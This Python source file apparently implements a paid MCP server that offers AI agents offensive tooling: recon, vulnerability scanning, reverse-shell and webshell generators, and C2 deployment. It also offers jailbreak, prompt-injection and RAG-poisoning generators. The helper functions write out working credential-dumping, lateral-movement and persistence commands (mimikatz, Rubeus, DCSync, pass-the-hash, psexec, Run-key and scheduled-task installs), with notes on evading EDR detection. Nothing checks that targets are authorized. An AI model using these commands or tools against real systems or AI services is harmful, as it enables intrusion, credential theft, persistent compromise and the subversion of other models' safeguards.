"""
Aegis MCP - Unified Offensive Security MCP
AI Security Testing Platform.

Consolidates Strix (planning/generation) and Kit (execution) into single interface.
"""
import os
import sys
import json
import logging
from datetime import datetime
from typing import Optional, List, Dict, Any
from pathlib import Path
from functools import wraps
from contextvars import ContextVar

# Add modules to path
MODULE_PATH = Path(__file__).parent.parent / "modules"
sys.path.insert(0, str(MODULE_PATH))

from mcp.server.fastmcp import FastMCP
from starlette.responses import JSONResponse
from starlette.routing import Route
from starlette.middleware.cors import CORSMiddleware
from starlette.middleware.base import BaseHTTPMiddleware
from starlette.requests import Request
import uvicorn
import asyncio

# Context variable for storing current user session across async calls
current_user: ContextVar[Optional['UserSession']] = ContextVar('current_user', default=None)

# Environment configuration
SUPABASE_URL = os.environ.get("SUPABASE_URL", "")
SUPABASE_KEY = os.environ.get("SUPABASE_KEY", "")
REQUIRE_AUTH = os.environ.get("REQUIRE_AUTH", "true").lower() == "true"

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger("aegis")

mcp = FastMCP("aegis")

# ============================================================================
# CREDIT COSTS CONFIGURATION
# ============================================================================

CREDIT_COSTS = {
    # AI Attack Tools
    "ai_fingerprint": 25,
    "jailbreak_generate": 50,
    "jailbreak_evaluate": 25,
    "prompt_injection_generate": 50,
    "rag_injection_craft": 50,
    "ai_tool_attack": 50,

    # Recon Tools
    "autonomous_recon": 100,
    "dns_enum": 25,
    "http_probe": 25,
    "content_analyze": 25,

    # Vulnerability Scanning
    "vuln_scan": 100,
    "vuln_scan_batch": 100,
    "sqli_scan": 50,
    "xss_scan": 50,
    "ssrf_scan": 50,

    # Payload Generation
    "generate_reverse_shell": 50,
    "generate_webshell": 50,
    "generate_injection": 25,
    "generate_callback": 25,
    "select_payloads": 50,

    # Infrastructure (Enterprise only)
    "deploy_c2_stack": 200,
    "burn_infrastructure": 50,
    "burn_all_infrastructure": 100,
    "infra_status": 10,
    "create_dns_record": 25,

    # Execution
    "harvest_credentials": 75,
    "lateral_movement": 75,
    "persistence_install": 75,

    # Operations
    "operation_start": 200,
    "operation_execute_phase": 150,
    "operation_status": 10,
    "operation_abort": 25,

    # Utilities
    "list_capabilities": 0,
    "get_module_info": 0
}

# ============================================================================
# TIER-BASED ACCESS CONTROL
# ============================================================================

TIER_ACCESS = {
    "free": [
        # Free tier: AI attack tools only
        "ai_fingerprint",
        "jailbreak_generate",
        "jailbreak_evaluate",
        "prompt_injection_generate",
        "rag_injection_craft",
        "ai_tool_attack",
        "list_capabilities",
        "get_module_info"
    ],
    "pro": [
        # Pro tier: All tools except infrastructure
        "ai_fingerprint", "jailbreak_generate", "jailbreak_evaluate",
        "prompt_injection_generate", "rag_injection_craft", "ai_tool_attack",
        "autonomous_recon", "dns_enum", "http_probe", "content_analyze",
        "vuln_scan", "vuln_scan_batch", "sqli_scan", "xss_scan", "ssrf_scan",
        "generate_reverse_shell", "generate_webshell", "generate_injection",
        "generate_callback", "select_payloads",
        "harvest_credentials", "lateral_movement", "persistence_install",
        "operation_start", "operation_execute_phase", "operation_status",
        "operation_abort", "list_capabilities", "get_module_info"
    ],
    "enterprise": [
        # Enterprise: Everything
        "*"  # Wildcard for all tools
    ]
}

# ============================================================================
# USER SESSION & AUTHENTICATION
# ============================================================================

class UserSession:
    """User session with credits and tier info."""
    def __init__(self, api_key: str, tier: str = "free", credits: int = 0, user_id: str = None):
        self.api_key = api_key
        self.tier = tier
        self.credits = credits
        self.user_id = user_id or "anonymous"
        self.usage_log = []

    def has_credits(self, amount: int) -> bool:
        """Check if user has enough credits."""
        return self.credits >= amount

    def deduct_credits(self, amount: int, tool_name: str):
        """Deduct credits and log usage."""
        self.credits -= amount
        log_entry = {
            "timestamp": datetime.utcnow().isoformat(),
            "tool": tool_name,
            "credits_used": amount,
            "credits_remaining": self.credits
        }
        self.usage_log.append(log_entry)
        logger.info(f"User {self.user_id} used {tool_name}: -{amount} credits (remaining: {self.credits})")

    def can_access_tool(self, tool_name: str) -> bool:
        """Check if user's tier allows access to tool."""
        allowed_tools = TIER_ACCESS.get(self.tier, [])
        if "*" in allowed_tools:  # Enterprise has access to everything
            return True
        return tool_name in allowed_tools

# Mock user sessions (in production, this would be in Supabase)
MOCK_USERS = {
    "test_free_key": UserSession("test_free_key", "free", 1000, "user_free_001"),
    "test_pro_key": UserSession("test_pro_key", "pro", 5000, "user_pro_001"),
    "test_enterprise_key": UserSession("test_enterprise_key", "enterprise", 50000, "user_ent_001"),
}

async def validate_api_key(api_key: str) -> Optional[UserSession]:
    """Validate API key against Supabase or mock data.

    In production, this would query Supabase to:
    1. Verify API key exists
    2. Get user tier
    3. Get current credit balance
    4. Check if key is active
    """
    if not REQUIRE_AUTH:
        # Development mode: return unlimited enterprise session
        return UserSession("dev_key", "enterprise", 999999, "dev_user")

    # Mock validation for now
    # TODO: Replace with Supabase query
    # from supabase import create_client
    # supabase = create_client(SUPABASE_URL, SUPABASE_KEY)
    # result = supabase.table('api_keys').select('*').eq('key', api_key).execute()

    user_session = MOCK_USERS.get(api_key)
    if user_session:
        return user_session

    return None

async def deduct_credits_supabase(user_session: UserSession, amount: int, tool_name: str):
    """Deduct credits in Supabase and log usage.

    In production, this would:
    1. Update user credits in Supabase
    2. Insert usage log record
    """
    # For now, just update local session
    user_session.deduct_credits(amount, tool_name)

    # TODO: Replace with Supabase update
    # supabase.table('users').update({'credits': user_session.credits}).eq('id', user_session.user_id).execute()
    # supabase.table('usage_logs').insert({
    #     'user_id': user_session.user_id,
    #     'tool': tool_name,
    #     'credits_used': amount,
    #     'timestamp': datetime.utcnow().isoformat()
    # }).execute()

# ============================================================================
# AUTHENTICATION MIDDLEWARE
# ============================================================================

class AuthMiddleware(BaseHTTPMiddleware):
    """Authentication middleware for HTTP requests."""

    async def dispatch(self, request: Request, call_next):
        # Skip auth for utility endpoints
        if request.url.path in ["/health", "/pricing"]:
            return await call_next(request)

        # Extract API key from header or query param
        api_key = request.headers.get("X-API-Key")
        if not api_key:
            api_key = request.query_params.get("api_key")

        if not api_key and REQUIRE_AUTH:
            return JSONResponse(
                {"error": "Missing API key. Provide X-API-Key header or api_key query parameter."},
                status_code=401
            )

        # Validate API key
        user_session = await validate_api_key(api_key)
        if not user_session and REQUIRE_AUTH:
            return JSONResponse(
                {"error": "Invalid API key"},
                status_code=401
            )

        # Store user session in request state AND context variable
        request.state.user_session = user_session
        current_user.set(user_session)

        try:
            response = await call_next(request)
            return response
        finally:
            # Clean up context
            current_user.set(None)

def check_tool_access(tool_name: str) -> dict:
    """Check if user has access to tool and sufficient credits.

    Returns:
        dict with 'allowed' (bool) and optional 'error' message
    """
    user_session = current_user.get()

    # If auth not required, allow everything
    if not REQUIRE_AUTH:
        return {"allowed": True}

    # If no user session, deny
    if not user_session:
        return {
            "allowed": False,
            "error": "Authentication required",
            "tier": None,
            "credits": 0
        }

    # Check tier access
    if not user_session.can_access_tool(tool_name):
        return {
            "allowed": False,
            "error": f"Tool '{tool_name}' not available for tier '{user_session.tier}'",
            "tier": user_session.tier,
            "credits": user_session.credits,
            "required_tier": _get_required_tier(tool_name)
        }

    # Check credit balance
    credit_cost = CREDIT_COSTS.get(tool_name, 0)
    if not user_session.has_credits(credit_cost):
        return {
            "allowed": False,
            "error": f"Insufficient credits. Required: {credit_cost}, Available: {user_session.credits}",
            "tier": user_session.tier,
            "credits": user_session.credits,
            "required_credits": credit_cost
        }

    return {
        "allowed": True,
        "tier": user_session.tier,
        "credits": user_session.credits,
        "cost": credit_cost
    }

def _get_required_tier(tool_name: str) -> str:
    """Determine minimum tier required for a tool."""
    for tier in ["free", "pro", "enterprise"]:
        allowed_tools = TIER_ACCESS[tier]
        if "*" in allowed_tools or tool_name in allowed_tools:
            return tier
    return "enterprise"

def require_credits(tool_name: str):
    """Decorator to check credits and tier access before tool execution."""
    def decorator(func):
        @wraps(func)
        def wrapper(*args, **kwargs):
            # Check access
            access_check = check_tool_access(tool_name)

            if not access_check["allowed"]:
                logger.warning(f"Access denied for tool '{tool_name}': {access_check.get('error')}")
                return {
                    "error": access_check["error"],
                    "tier": access_check.get("tier"),
                    "credits": access_check.get("credits"),
                    "required_tier": access_check.get("required_tier"),
                    "required_credits": access_check.get("required_credits")
                }

            # Execute tool
            try:
                result = func(*args, **kwargs)

                # Deduct credits after successful execution
                user_session = current_user.get()
                if user_session and REQUIRE_AUTH:
                    credit_cost = CREDIT_COSTS.get(tool_name, 0)
                    if credit_cost > 0:
                        user_session.deduct_credits(credit_cost, tool_name)
                        logger.info(f"Deducted {credit_cost} credits for {tool_name}")

                return result

            except Exception as e:
                logger.error(f"Error executing tool '{tool_name}': {e}")
                # Don't deduct credits on error
                return {"error": f"Tool execution failed: {str(e)}"}

        # Store credit cost and tool name as metadata
        wrapper._credit_cost = CREDIT_COSTS.get(tool_name, 0)
        wrapper._tool_name = tool_name
        return wrapper
    return decorator

# ============================================================================
# OPERATION STATE MANAGEMENT
# ============================================================================

OPERATIONS: Dict[str, dict] = {}

def save_operation(op: dict):
    """Persist operation state."""
    OPERATIONS[op["id"]] = op

def load_operation(op_id: str) -> Optional[dict]:
    """Load operation state."""
    return OPERATIONS.get(op_id)

# ============================================================================
# RECON TOOLS
# ============================================================================

@mcp.tool()
@require_credits("autonomous_recon")
def autonomous_recon(target: str, depth: int = 2, aggressive: bool = False) -> dict:
    """Full Target Discovery - Complete autonomous reconnaissance pipeline.

    Combines DNS enumeration, HTTP probing, and content analysis
    for complete target mapping without human guidance.

    Args:
        target: Domain or IP to recon
        depth: Recursion depth for subdomain discovery (1-3)
        aggressive: Enable aggressive scanning techniques
    """
    from recon.autonomous import AutonomousRecon
    scanner = AutonomousRecon()
    return scanner.full_recon(target, depth)

@mcp.tool()
@require_credits("dns_enum")
def dns_enum(domain: str, wordlist: str = None) -> dict:
    """DNS enumeration: subdomains via crt.sh, DNS records, live resolution.

    Args:
        domain: Target domain
        wordlist: Optional custom wordlist for bruteforce
    """
    from recon.dns_enum import DNSEnumerator
    enum = DNSEnumerator()
    return enum.enumerate(domain)

@mcp.tool()
@require_credits("http_probe")
def http_probe(targets: list, threads: int = 20, follow_redirects: bool = True) -> dict:
    """Probe targets for live HTTP services with tech fingerprinting.

    Args:
        targets: List of hosts/URLs to probe
        threads: Concurrent probe threads
        follow_redirects: Follow HTTP redirects
    """
    from recon.http_probe import HTTPProber
    prober = HTTPProber(threads=threads)
    return {"live_hosts": prober.probe_many(targets)}

@mcp.tool()
@require_credits("content_analyze")
def content_analyze(url: str, extract_secrets: bool = True) -> dict:
    """Analyze page content for endpoints, parameters, and API patterns.

    Args:
        url: Target URL to analyze
        extract_secrets: Look for exposed credentials/keys
    """
    from recon.content_analyzer import ContentAnalyzer
    import requests
    analyzer = ContentAnalyzer()
    try:
        resp = requests.get(url, timeout=10, verify=False)
        return analyzer.analyze(url, resp.text)
    except Exception as e:
        return {"error": str(e)}

# ============================================================================
# VULNERABILITY SCANNING
# ============================================================================

@mcp.tool()
@require_credits("vuln_scan")
def vuln_scan(url: str, params: list = None, callback_host: str = None) -> dict:
    """Comprehensive vulnerability scan: SQLi, XSS, SSRF, SSTI, LFI.

    Args:
        url: Target URL
        params: Specific parameters to test (None = auto-detect)
        callback_host: OOB callback host for blind vulns
    """
    from vuln.scanner import VulnScanner
    scanner = VulnScanner(callback_host)
    return {"findings": scanner.scan_endpoint(url, params)}

@mcp.tool()
@require_credits("vuln_scan_batch")
def vuln_scan_batch(targets: list, threads: int = 10) -> dict:
    """Scan multiple targets concurrently.

    Args:
        targets: List of URLs to scan
        threads: Concurrent scan threads
    """
    from vuln.scanner import VulnScanner
    scanner = VulnScanner()
    return {"findings": scanner.scan_many(targets, threads)}

@mcp.tool()
@require_credits("sqli_scan")
def sqli_scan(url: str, param: str, method: str = "GET", blind: bool = True) -> dict:
    """Targeted SQL injection scan.

    Detection: error-based, time-based blind, boolean blind, UNION

    Args:
        url: Target URL
        param: Parameter to test
        method: HTTP method
        blind: Enable time-based blind detection
    """
    from vuln.sqli import SQLiScanner
    scanner = SQLiScanner()
    return {"findings": scanner.scan_param(url, param, method)}

@mcp.tool()
@require_credits("xss_scan")
def xss_scan(url: str, param: str, context_aware: bool = True) -> dict:
    """Targeted XSS scan with context-aware detection.

    Args:
        url: Target URL
        param: Parameter to test
        context_aware: Adapt payloads to HTML context
    """
    from vuln.xss import XSSScanner
    scanner = XSSScanner()
    return {"findings": scanner.scan_param(url, param)}

@mcp.tool()
@require_credits("ssrf_scan")
def ssrf_scan(url: str, param: str, callback_host: str = None) -> dict:
    """Targeted SSRF scan with cloud metadata detection.

    Tests: AWS/GCP/Azure metadata, internal network, protocol handlers

    Args:
        url: Target URL
        param: Parameter to test
        callback_host: OOB verification host
    """
    from vuln.ssrf import SSRFScanner
    scanner = SSRFScanner(callback_host)
    return {"findings": scanner.scan_param(url, param)}

# ============================================================================
# PAYLOAD GENERATION
# ============================================================================

@mcp.tool()
@require_credits("generate_reverse_shell")
def generate_reverse_shell(
    host: str,
    port: int,
    os_type: str = "linux",
    languages: list = None,
    waf_detected: bool = False,
    av_detected: bool = False,
    encoded: bool = False
) -> dict:
    """Generate adaptive reverse shell based on target fingerprint.

    Args:
        host: Callback host
        port: Callback port
        os_type: Target OS (linux/windows/macos)
        languages: Available interpreters on target
        waf_detected: Apply WAF bypass techniques
        av_detected: Apply AV evasion techniques
        encoded: Base64/hex encode payload
    """
    from payload.adaptive import AdaptivePayloadGenerator
    gen = AdaptivePayloadGenerator()
    fingerprint = {"os": os_type, "languages": languages or []}
    return gen.generate_reverse_shell(host, port, fingerprint, waf_detected, av_detected)

@mcp.tool()
@require_credits("generate_webshell")
def generate_webshell(
    technology: str = "php",
    stealth_level: int = 1,
    password: str = None
) -> dict:
    """Generate webshell adapted to target technology.

    Args:
        technology: Target tech (php/asp/aspx/jsp/python)
        stealth_level: 0=basic, 1=obfuscated, 2=encrypted
        password: Optional authentication password
    """
    from payload.adaptive import AdaptivePayloadGenerator
    gen = AdaptivePayloadGenerator()
    return gen.generate_webshell({"technology": technology}, stealth_level)

@mcp.tool()
@require_credits("generate_injection")
def generate_injection(
    injection_type: str,
    context: str = "html",
    waf_detected: bool = False,
    count: int = 5
) -> dict:
    """Generate injection payloads with optional WAF bypass.

    Args:
        injection_type: sqli/xss/ssti/rce/lfi
        context: Injection context (html/js/sql/cmd)
        waf_detected: Apply bypass techniques
        count: Number of variants to generate
    """
    from payload.adaptive import AdaptivePayloadGenerator
    gen = AdaptivePayloadGenerator()
    return {"payloads": gen.generate_injection_payload(injection_type, context, waf_detected)}

@mcp.tool()
@require_credits("generate_callback")
def generate_callback(host: str, port: int, callback_type: str = "http") -> dict:
    """Generate OOB callback payload for verification.

    Args:
        host: Callback host
        port: Callback port
        callback_type: http/dns/icmp
    """
    from payload.adaptive import AdaptivePayloadGenerator
    gen = AdaptivePayloadGenerator()
    return gen.generate_callback(host, port, callback_type)

@mcp.tool()
@require_credits("select_payloads")
def select_payloads(recon_data: dict, vuln_findings: list, objective: str) -> dict:
    """Intelligently select payloads based on recon + vulns + objective.

    Uses kill chain logic to select optimal exploitation path.

    Args:
        recon_data: Output from autonomous_recon
        vuln_findings: Output from vuln_scan
        objective: Goal (shell/data/persist/pivot)
    """
    from payload.selector import PayloadSelector
    selector = PayloadSelector()
    return {"payloads": selector.select_for_target(recon_data, vuln_findings, objective)}

# ============================================================================
# INFRASTRUCTURE AUTOMATION
# ============================================================================

@mcp.tool()
@require_credits("deploy_c2_stack")
def deploy_c2_stack(
    operation_id: str,
    provider: str = "digitalocean",
    region: str = None,
    redirector_count: int = 1,
    domain: str = None
) -> dict:
    """Deploy ephemeral C2 infrastructure: main server + redirectors.

    Args:
        operation_id: Unique operation identifier
        provider: Cloud provider (digitalocean/vultr/linode/aws)
        region: Deployment region (None = random)
        redirector_count: Number of redirector servers
        domain: Optional domain for DNS setup
    """
    from infra.manager import InfrastructureManager
    mgr = InfrastructureManager(provider)
    return mgr.deploy_c2_stack(operation_id, region, redirector_count)

@mcp.tool()
@require_credits("burn_infrastructure")
def burn_infrastructure(operation_id: str, secure_wipe: bool = True) -> dict:
    """Destroy all infrastructure for operation. IRREVERSIBLE.

    Args:
        operation_id: Operation to burn
        secure_wipe: Overwrite before deletion
    """
    from infra.manager import InfrastructureManager
    mgr = InfrastructureManager()
    return mgr.burn_stack(operation_id)

@mcp.tool()
@require_credits("burn_all_infrastructure")
def burn_all_infrastructure(confirm: str = "") -> dict:
    """EMERGENCY: Destroy ALL active infrastructure.

    Args:
        confirm: Must be "CONFIRM_BURN_ALL" to proceed
    """
    if confirm != "CONFIRM_BURN_ALL":
        return {"error": "Must pass confirm='CONFIRM_BURN_ALL' to proceed"}
    from infra.manager import InfrastructureManager
    mgr = InfrastructureManager()
    return mgr.burn_all()

@mcp.tool()
@require_credits("infra_status")
def infra_status(operation_id: str = None) -> dict:
    """Get infrastructure status for operation or list all.

    Args:
        operation_id: Specific operation (None = list all)
    """
    from infra.manager import InfrastructureManager
    mgr = InfrastructureManager()
    if operation_id:
        return mgr.get_stack_status(operation_id)
    return {"active_operations": mgr.list_active_operations()}

@mcp.tool()
@require_credits("create_dns_record")
def create_dns_record(
    name: str,
    ip: str,
    record_type: str = "A",
    proxied: bool = False
) -> dict:
    """Create DNS record for C2 domain.

    Args:
        name: Record name (subdomain)
        ip: Target IP address
        record_type: A/AAAA/CNAME
        proxied: Enable Cloudflare proxy
    """
    from infra.dns import CloudflareDNS
    dns = CloudflareDNS()
    return dns.create_record(name, ip, proxied=proxied)

# ============================================================================
# AI ATTACK MODULE
# ============================================================================

@mcp.tool()
@require_credits("ai_fingerprint")
def ai_fingerprint(responses: list) -> dict:
    """Identify AI Model - Fingerprint AI model from probe responses.

    Args:
        responses: List of {"probe": "...", "response": "..."} dicts

    Returns model family, guardrail patterns, capability indicators.
    """
    from ai_attack.fingerprint import ModelFingerprinter
    fp = ModelFingerprinter()
    return fp.analyze_responses(responses)

@mcp.tool()
@require_credits("jailbreak_generate")
def jailbreak_generate(
    payload: str,
    technique: str = None,
    count: int = 5,
    model_hint: str = None
) -> dict:
    """Generate Safety Bypass Tests - Generate jailbreak attempts for AI systems.

    Techniques: dan, roleplay, hypothetical, translation, encoding,
                context_manipulation, instruction_hierarchy, crescendo

    Args:
        payload: Core instruction to inject
        technique: Specific technique (None = all)
        count: Variants per technique
        model_hint: Target model family for optimization
    """
    from ai_attack.jailbreak import JailbreakEngine
    engine = JailbreakEngine()
    return {"attacks": engine.generate_attack(payload, technique, count)}

@mcp.tool()
@require_credits("jailbreak_evaluate")
def jailbreak_evaluate(
    response: str,
    original_payload: str,
    expected_behavior: str = None
) -> dict:
    """Evaluate if jailbreak attempt succeeded.

    Args:
        response: AI model's response
        original_payload: What we tried to inject
        expected_behavior: Expected response pattern
    """
    from ai_attack.jailbreak import JailbreakEngine
    engine = JailbreakEngine()
    return engine.evaluate_success(response, original_payload)

@mcp.tool()
@require_credits("prompt_injection_generate")
def prompt_injection_generate(
    payload: str,
    technique: str = None,
    target_context: str = None
) -> dict:
    """Create Injection Test Payloads - Generate prompt injection payloads.

    Techniques: direct, delimiter_escape, context_overflow,
                indirect, data_exfiltration, instruction_override

    Args:
        payload: Instruction to inject
        technique: Specific technique (None = all)
        target_context: Application context for optimization
    """
    from ai_attack.injection import PromptInjector
    injector = PromptInjector()
    return {"injections": injector.generate_injections(payload, technique)}

@mcp.tool()
@require_credits("rag_injection_craft")
def rag_injection_craft(
    payload: str,
    document_type: str = "text",
    stealth_level: int = 1
) -> dict:
    """Craft injection payload hidden in documents for RAG systems.

    Args:
        payload: Instruction to inject
        document_type: text/pdf/markdown/html
        stealth_level: 0=obvious, 1=hidden, 2=encrypted
    """
    from ai_attack.injection import PromptInjector
    injector = PromptInjector()
    return {"document": injector.craft_rag_injection(payload, document_type)}

@mcp.tool()
@require_credits("ai_tool_attack")
def ai_tool_attack(
    target_tool: str,
    payload: str,
    exfil_channel: str = None
) -> dict:
    """Craft attack through AI tool use (code exec, web search, etc).

    Args:
        target_tool: Tool to abuse (code_execution/web_search/file_access)
        payload: Attack payload
        exfil_channel: Data exfiltration method
    """
    from ai_attack.injection import AIToolAttacker
    attacker = AIToolAttacker()
    return attacker.craft_tool_injection(target_tool, payload)

# ============================================================================
# EXECUTION MODULES (POST-EXPLOITATION)
# ============================================================================

@mcp.tool()
@require_credits("harvest_credentials")
def harvest_credentials(
    technique: str = "all",
    target_os: str = "windows"
) -> dict:
    """Credential harvesting techniques.

    Args:
        technique: lsass/sam/kerberoast/dcsync/dpapi/all
        target_os: windows/linux
    """
    return {
        "technique": technique,
        "target_os": target_os,
        "commands": _get_cred_commands(technique, target_os),
        "tools_required": _get_cred_tools(technique)
    }

def _get_cred_commands(technique: str, os: str) -> list:
    """Return credential harvesting commands."""
    commands = {
        "lsass": ["mimikatz.exe sekurlsa::logonpasswords", "procdump -ma lsass.exe lsass.dmp"],
        "sam": ["reg save HKLM\\SAM sam.hiv", "reg save HKLM\\SYSTEM system.hiv"],
        "kerberoast": ["Rubeus.exe kerberoast /outfile:hashes.txt"],
        "dcsync": ["mimikatz.exe lsadump::dcsync /domain:DOMAIN /all"],
        "dpapi": ["mimikatz.exe dpapi::chrome", "SharpDPAPI.exe triage"]
    }
    if technique == "all":
        return [cmd for cmds in commands.values() for cmd in cmds]
    return commands.get(technique, [])

def _get_cred_tools(technique: str) -> list:
    """Return required tools."""
    tools = {
        "lsass": ["mimikatz", "procdump"],
        "sam": ["reg"],
        "kerberoast": ["Rubeus"],
        "dcsync": ["mimikatz"],
        "dpapi": ["mimikatz", "SharpDPAPI"]
    }
    if technique == "all":
        return list(set(t for ts in tools.values() for t in ts))
    return tools.get(technique, [])

@mcp.tool()
@require_credits("lateral_movement")
def lateral_movement(
    technique: str,
    target: str,
    credential_type: str = "hash"
) -> dict:
    """Generate lateral movement command.

    Args:
        technique: pth/ptt/wmi/dcom/ssh/psexec
        target: Target host
        credential_type: hash/ticket/password
    """
    return {
        "technique": technique,
        "target": target,
        "command_template": _get_lateral_command(technique),
        "requirements": _get_lateral_reqs(technique, credential_type)
    }

def _get_lateral_command(technique: str) -> str:
    """Return lateral movement command template."""
    templates = {
        "pth": "mimikatz.exe sekurlsa::pth /user:{user} /domain:{domain} /ntlm:{hash} /run:cmd.exe",
        "ptt": "Rubeus.exe ptt /ticket:{ticket}",
        "wmi": "wmic /node:{target} /user:{user} /password:{pass} process call create 'cmd.exe /c {cmd}'",
        "dcom": "Invoke-DCOM -ComputerName {target} -Method MMC20 -Command '{cmd}'",
        "psexec": "psexec.exe \\\\{target} -u {user} -p {pass} cmd.exe"
    }
    return templates.get(technique, "")

def _get_lateral_reqs(technique: str, cred_type: str) -> list:
    """Return requirements for lateral movement."""
    return [f"Requires {cred_type}", f"Target port access", "Local admin on target"]

@mcp.tool()
@require_credits("persistence_install")
def persistence_install(
    technique: str,
    payload_path: str,
    target_os: str = "windows"
) -> dict:
    """Generate persistence installation command.

    Args:
        technique: registry/service/wmi/scheduled_task/golden_ticket
        payload_path: Path to payload on target
        target_os: windows/linux
    """
    return {
        "technique": technique,
        "command": _get_persist_command(technique, payload_path),
        "detection_risk": _get_persist_detection(technique),
        "removal": _get_persist_removal(technique)
    }

def _get_persist_command(technique: str, path: str) -> str:
    """Return persistence command."""
    templates = {
        "registry": f'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Update /t REG_SZ /d "{path}"',
        "service": f'sc create SvcName binPath= "{path}" start= auto',
        "scheduled_task": f'schtasks /create /tn "Update" /tr "{path}" /sc onlogon /ru SYSTEM',
        "wmi": 'Get-WMIObject ... # WMI subscription persistence',
        "golden_ticket": 'mimikatz.exe kerberos::golden /domain:{domain} /sid:{sid} /krbtgt:{hash}'
    }
    return templates.get(technique, "")

def _get_persist_detection(technique: str) -> str:
    """Return detection risk level."""
    risks = {
        "registry": "MEDIUM - Common location monitored by EDR",
        "service": "HIGH - Service creation logged",
        "scheduled_task": "MEDIUM - Task scheduler monitored",
        "wmi": "LOW - Less commonly monitored",
        "golden_ticket": "LOW - No persistent artifact"
    }
    return risks.get(technique, "UNKNOWN")

def _get_persist_removal(technique: str) -> str:
    """Return removal command."""
    removal = {
        "registry": "reg delete HKCU\\...\\Run /v Update /f",
        "service": "sc delete SvcName",
        "scheduled_task": "schtasks /delete /tn Update /f",
        "wmi": "Get-WMIObject -Class __FilterToConsumerBinding | Remove-WMIObject"
    }
    return removal.get(technique, "Manual removal required")

# ============================================================================
# FULL OPERATIONS
# ============================================================================

@mcp.tool()
@require_credits("operation_start")
def operation_start(
    target: str,
    objectives: list,
    stealth_level: int = 3,
    autonomous: bool = True,
    callback_host: str = None
) -> dict:
    """Initialize full offensive operation.

    Args:
        target: Primary target domain/IP
        objectives: List of goals (recon/shell/data/persist/pivot)
        stealth_level: 1=loud, 3=balanced, 5=paranoid
        autonomous: Allow autonomous phase progression
        callback_host: C2 callback host
    """
    op = {
        "id": f"aegis_{datetime.utcnow().strftime('%Y%m%d_%H%M%S')}",
        "target": target,
        "objectives": objectives,
        "stealth": stealth_level,
        "autonomous": autonomous,
        "callback_host": callback_host,
        "status": "initialized",
        "created_at": datetime.utcnow().isoformat(),
        "phases": {
            "recon": {"status": "pending", "results": None},
            "vuln_scan": {"status": "pending", "results": None},
            "payload_gen": {"status": "pending", "results": None},
            "delivery": {"status": "pending", "results": None},
            "persist": {"status": "pending", "results": None},
            "exfil": {"status": "pending", "results": None}
        },
        "findings": [],
        "artifacts": []
    }
    save_operation(op)
    return op

@mcp.tool()
@require_credits("operation_execute_phase")
def operation_execute_phase(
    operation_id: str,
    phase: str,
    phase_config: dict = None
) -> dict:
    """Execute specific phase of operation.

    Phases: recon, vuln_scan, payload_gen, delivery, persist, exfil

    Args:
        operation_id: Operation to advance
        phase: Phase to execute
        phase_config: Override default phase configuration
    """
    op = load_operation(operation_id)
    if not op:
        return {"error": f"Operation {operation_id} not found"}

    results = {}

    if phase == "recon":
        results = autonomous_recon(op["target"], depth=2)

    elif phase == "vuln_scan":
        recon = op["phases"]["recon"].get("results", {})
        targets = recon.get("live_hosts", [op["target"]])
        results = vuln_scan_batch(targets)

    elif phase == "payload_gen":
        recon = op["phases"]["recon"].get("results", {})
        vulns = op["phases"]["vuln_scan"].get("results", {}).get("findings", [])
        objective = op["objectives"][0] if op["objectives"] else "shell"
        results = select_payloads(recon, vulns, objective)

    elif phase == "delivery":
        results = {"status": "manual_required", "message": "Delivery requires operator confirmation"}

    elif phase == "persist":
        results = persistence_install("registry", "C:\\Windows\\Temp\\svc.exe")

    elif phase == "exfil":
        results = {"status": "manual_required", "message": "Exfil requires operator confirmation"}

    # Update operation state
    op["phases"][phase] = {"status": "completed", "results": results}
    save_operation(op)

    return {"operation_id": operation_id, "phase": phase, "status": "completed", "results": results}

@mcp.tool()
@require_credits("operation_status")
def operation_status(operation_id: str) -> dict:
    """Get current operation status and phase results."""
    op = load_operation(operation_id)
    if not op:
        return {"error": f"Operation {operation_id} not found"}
    return op

@mcp.tool()
@require_credits("operation_abort")
def operation_abort(operation_id: str, burn_infra: bool = False) -> dict:
    """Abort operation and optionally burn infrastructure.

    Args:
        operation_id: Operation to abort
        burn_infra: Also destroy deployed infrastructure
    """
    op = load_operation(operation_id)
    if not op:
        return {"error": f"Operation {operation_id} not found"}

    op["status"] = "aborted"
    op["aborted_at"] = datetime.utcnow().isoformat()
    save_operation(op)

    if burn_infra:
        burn_infrastructure(operation_id)

    return {"operation_id": operation_id, "status": "aborted", "infra_burned": burn_infra}

# ============================================================================
# UTILITIES
# ============================================================================

@mcp.tool()
@require_credits("list_capabilities")
def list_capabilities() -> dict:
    """List all Aegis MCP capabilities by category."""
    return {
        "recon": [
            "autonomous_recon", "dns_enum", "http_probe", "content_analyze"
        ],
        "vuln_scan": [
            "vuln_scan", "vuln_scan_batch", "sqli_scan", "xss_scan", "ssrf_scan"
        ],
        "payload": [
            "generate_reverse_shell", "generate_webshell", "generate_injection",
            "generate_callback", "select_payloads"
        ],
        "infrastructure": [
            "deploy_c2_stack", "burn_infrastructure", "burn_all_infrastructure",
            "infra_status", "create_dns_record"
        ],
        "ai_attack": [
            "ai_fingerprint", "jailbreak_generate", "jailbreak_evaluate",
            "prompt_injection_generate", "rag_injection_craft", "ai_tool_attack"
        ],
        "execution": [
            "harvest_credentials", "lateral_movement", "persistence_install"
        ],
        "operations": [
            "operation_start", "operation_execute_phase",
            "operation_status", "operation_abort"
        ]
    }

@mcp.tool()
@require_credits("get_module_info")
def get_module_info(module: str) -> dict:
    """Get detailed info about a specific module/tool."""
    caps = list_capabilities()
    for category, tools in caps.items():
        if module in tools:
            # Get credit cost and tier requirements
            credit_cost = CREDIT_COSTS.get(module, 0)
            required_tier = _get_required_tier(module)
            return {
                "module": module,
                "category": category,
                "available": True,
                "credit_cost": credit_cost,
                "minimum_tier": required_tier
            }
    return {"module": module, "available": False}

# ============================================================================
# HTTP SERVER
# ============================================================================

async def health_handler(request):
    """Health check endpoint."""
    caps = list_capabilities()
    tool_count = sum(len(tools) for tools in caps.values())
    return JSONResponse({
        "status": "healthy",
        "service": "aegis-mcp",
        "version": "1.0.0",
        "categories": len(caps),
        "tools": tool_count,
        "active_operations": len(OPERATIONS),
        "auth_required": REQUIRE_AUTH
    })

async def credits_handler(request):
    """Get user credit balance and usage stats."""
    user_session = getattr(request.state, "user_session", None)
    if not user_session:
        return JSONResponse(
            {"error": "Authentication required"},
            status_code=401
        )

    return JSONResponse({
        "user_id": user_session.user_id,
        "tier": user_session.tier,
        "credits": user_session.credits,
